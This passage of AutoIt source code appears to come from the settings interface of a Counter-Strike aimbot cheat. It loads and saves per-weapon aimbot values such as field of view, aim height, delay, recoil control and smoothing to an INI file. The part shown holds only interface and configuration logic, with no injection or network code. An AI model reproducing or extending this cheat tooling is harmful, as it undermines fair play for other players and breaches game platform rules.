						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_tec9.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "taser"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_taser.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_taser.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_taser.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_taser.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_taser.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "mp9"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mp9.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mp9.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mp9.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_mp9.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mp9.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "scar17"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_scar17.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_scar17.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_scar17.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_scar17.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_scar17.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "ssg08"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_ssg08.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_ssg08.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_ssg08.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_ssg08.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_ssg08.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf




			EndSwitch



		Case $smoothmin
			$smooth -=1
			If $smooth < 0 Then
			$smooth = 0
			EndIf
			GUICtrlSetData($smoothdis, $smooth)

		Case $smoothplus
			$smooth +=1
			GUICtrlSetData($smoothdis, $smooth)

		Case $VISon
			If $viasghfaf = 1 Then
				GUICtrlSetImage($VISon, @TempDir & "\Disable.bmp")
				$viasghfaf = 0
			Else
				GUICtrlSetImage($VISon, @TempDir & "\Active.bmp")
				$viasghfaf = 1
			EndIf

		Case $keymin
			$key -=1
			If $key < 1 Then
			$key = 1
			EndIf
			GUICtrlSetData($keydis, $key)

		Case $keyplus
			$key +=1
			GUICtrlSetData($keydis, $key)


			Case $Aimon
				If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
						$readenablevalue = 0
				Else
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
						$readenablevalue = 1
				EndIf

			Case $RCSon
				If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
						$readrcsvalue = 0
				Else
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
						$readrcsvalue = 1
				EndIf


			Case $fovleft
				$readfovvalue -=1
				If $readfovvalue < 1 Then
				$readfovvalue = 1
				EndIf
				GUICtrlSetData($menufov, $readfovvalue)

			Case $fovright
				$readfovvalue +=1
				If $readfovvalue > 12 Then
				$readfovvalue = 12
				EndIf
				GUICtrlSetData($menufov, $readfovvalue)

			Case $heightleft
				$readheightvalue -=1
				If $readheightvalue < 1 Then
				$readheightvalue = 1
				EndIf
				GUICtrlSetData($menuheight, $readheightvalue)

			Case $heightright
				$readheightvalue +=1
				GUICtrlSetData($menuheight, $readheightvalue)

			Case $delayleft
				$readdelayvalue -=1
				If $readdelayvalue < 0 Then
				$readdelayvalue = 0
				EndIf
				GUICtrlSetData($menudelay, $readdelayvalue)

			Case $delayright
				$readdelayvalue +=1
				GUICtrlSetData($menudelay, $readdelayvalue)

			Case $save
				$readw = GUICtrlRead($hCombo)
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)

				If $readw = "Deagle" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_deagle.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_deagle.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_deagle.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_deagle.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_deagle.rcs", $readrcsvalue)

				EndIf
				If $readw = "P2000" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p2000.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p2000.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p2000.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p2000.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p2000.rcs", $readrcsvalue)

				EndIf
				If $readw = "elite" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_elite.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_elite.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_elite.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_elite.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_elite.rcs", $readrcsvalue)

				EndIf
				If $readw = "p90" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p90.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p90.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p90.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p90.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p90.rcs", $readrcsvalue)

				EndIf
				If $readw = "mac10" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mac10.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mac10.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mac10.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mac10.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mac10.rcs", $readrcsvalue)
				EndIf
				If $readw = "bizon" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_bizon.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_bizon.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_bizon.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_bizon.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_bizon.rcs", $readrcsvalue)
				EndIf
				If $readw = "sg553" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sg553.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sg553.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sg553.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sg553.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sg553.rcs", $readrcsvalue)
				EndIf
				If $readw = "fiveseven" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_fiveseven.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_fiveseven.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_fiveseven.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_fiveseven.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_fiveseven.rcs", $readrcsvalue)
				EndIf
				If $readw = "glock" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_glock.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_glock.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_glock.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_glock.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_glock.rcs", $readrcsvalue)
				EndIf
				If $readw = "p228" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p228.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p228.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p228.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p228.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p228.rcs", $readrcsvalue)
				EndIf
				If $readw = "p250" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p250.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p250.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p250.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p250.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_p250.rcs", $readrcsvalue)
				EndIf
				If $readw = "usp" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_usp.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_usp.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_usp.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_usp.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_usp.rcs", $readrcsvalue)
				EndIf
				If $readw = "famas" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_famas.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_famas.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_famas.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_famas.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_famas.rcs", $readrcsvalue)
				EndIf
				If $readw = "ak47" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_ak47.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_ak47.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_ak47.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_ak47.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_ak47.rcs", $readrcsvalue)
				EndIf
				If $readw = "nova" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_nova.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_nova.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_nova.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_nova.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_nova.rcs", $readrcsvalue)
				EndIf
				If $readw = "mag7" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mag7.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mag7.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mag7.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mag7.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mag7.rcs", $readrcsvalue)
				EndIf
				If $readw = "ump45" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_ump45.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_ump45.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_ump45.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_ump45.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_ump45.rcs", $readrcsvalue)
				EndIf
				If $readw = "mp7" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mp7.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mp7.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mp7.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mp7.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mp7.rcs", $readrcsvalue)
				EndIf
				If $readw = "m4a1" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_m4a1.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_m4a1.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_m4a1.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_m4a1.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_m4a1.rcs", $readrcsvalue)
				EndIf
				If $readw = "galil" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_galil.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_galil.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_galil.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_galil.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_galil.rcs", $readrcsvalue)
				EndIf
				If $readw = "galilar" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_galilar.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_galilar.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_galilar.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_galilar.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_galilar.rcs", $readrcsvalue)
				EndIf
				If $readw = "aug" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_aug.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_aug.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_aug.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_aug.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_aug.rcs", $readrcsvalue)
				EndIf
				If $readw = "scar20" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_scar20.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_scar20.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_scar20.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_scar20.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_scar20.rcs", $readrcsvalue)
				EndIf
				If $readw = "awp" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_awp.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_awp.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_awp.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_awp.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_awp.rcs", $readrcsvalue)
				EndIf
				If $readw = "g3sg1" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_g3sg1.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_g3sg1.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_g3sg1.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_g3sg1.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_g3sg1.rcs", $readrcsvalue)
				EndIf
				If $readw = "m249" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_m249.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_m249.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_m249.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_m249.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_m249.rcs", $readrcsvalue)
				EndIf
				If $readw = "m3" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_m3.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_m3.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_m3.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_m3.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_m3.rcs", $readrcsvalue)
				EndIf
				If $readw = "mp5navy" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mp5navy.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mp5navy.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mp5navy.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mp5navy.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mp5navy.rcs", $readrcsvalue)
				EndIf
				If $readw = "scout" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_scout.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_scout.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_scout.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_scout.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_scout.rcs", $readrcsvalue)
				EndIf
				If $readw = "sg550" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sg550.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sg550.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sg550.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sg550.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sg550.rcs", $readrcsvalue)
				EndIf
				If $readw = "sg552" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sg552.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sg552.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sg552.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sg552.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sg552.rcs", $readrcsvalue)
				EndIf
				If $readw = "tmp" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_tmp.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_tmp.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_tmp.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_tmp.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_tmp.rcs", $readrcsvalue)
				EndIf
				If $readw = "xm1014" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_xm1014.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_xm1014.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_xm1014.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_xm1014.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_xm1014.rcs", $readrcsvalue)
				EndIf
				If $readw = "negev" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_negev.fov", $readfovvalue)
